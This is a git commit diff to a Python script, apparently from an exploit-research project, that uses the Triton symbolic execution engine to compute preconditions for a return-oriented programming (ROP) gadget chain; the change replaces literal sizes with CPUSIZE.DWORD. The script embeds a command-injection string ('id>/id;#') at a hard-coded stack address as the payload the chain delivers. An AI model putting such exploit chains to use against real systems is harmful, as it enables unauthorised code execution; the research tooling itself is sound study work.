6f8335d979da9613561479c973871fa278ce0f40
Damian Pfammatter <pfammatter.damian@gmail.com>
2024-04-29 16:24:02 +0200

    Use of CPUSIZE.DWORD

--- morion/circled.rop2.py
+++ morion/circled.rop2.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 ## -*- coding: utf-8 -*-
 from pprint import pprint
-from triton import MemoryAccess
+from triton import CPUSIZE, MemoryAccess
 
 # Usage: `run -i circled.rop1.py`
 ctx = ctx
@@ -13,12 +13,12 @@ cmd         = "id>/id;#"
 cmd_addr    = 0xbeffc0c4+396
 
 # Preconditions gadget 0
-g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*4
-g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*4, 4))
+g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*CPUSIZE.DWORD
+g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*CPUSIZE.DWORD, CPUSIZE.DWORD))
 g0_pc_val  = 0xc9b8
-g0_r6_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+2*4, 4))
+g0_r6_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+2*CPUSIZE.DWORD, CPUSIZE.DWORD))
 g0_r6_val  = cmd_addr
-g0__r6_ast = ctx.getMemoryAst(MemoryAccess(cmd_addr, 16))
+g0__r6_ast = ctx.getMemoryAst(MemoryAccess(cmd_addr, 4*CPUSIZE.DWORD))
 g0__r6_val = int.from_bytes(bytes(cmd, "UTF-8"), byteorder="little")
 
 # Solve preconditions
